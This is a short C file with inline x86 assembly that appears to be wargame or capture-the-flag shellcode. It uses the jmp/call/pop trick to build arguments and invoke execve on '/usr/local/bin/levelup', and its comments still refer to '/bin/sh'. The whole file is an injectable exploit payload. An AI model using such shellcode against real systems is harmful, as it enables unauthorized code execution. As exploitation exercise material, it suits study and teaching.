main () {
__asm__(
    "       jmp mcall               \n\t" // jump trick to load "/bin/sh" string
    "ajmp:  pop %ebx                \n\t" // pop "/bin/sh" into ebx
    "       xor %eax, %eax          \n\t" // NULL out eax
    "       mov %al,0x16(%ebx)      \n\t" // NULL terminate "/bin/sh" string
    "       mov %ebx,0x17(%ebx)     \n\t" // set next 4 bytes to "/bin/sh" address
    "       mov %eax,0x1b(%ebx)     \n\t" // set next 4 bytes to NULL
    "       mov $0xb,%al            \n\t" // set eax to syscall 11
    "       lea 0x17(%ebx),%ecx     \n\t" // load str address into ecx
    "       lea 0x1b(%ebx),%edx     \n\t" // load NULL into edx
    "       int $0x80               \n\t" // call execve syscall
    "mcall: call ajmp               \n\t"
    "       .string \"/usr/local/bin/levelup\""
);
}
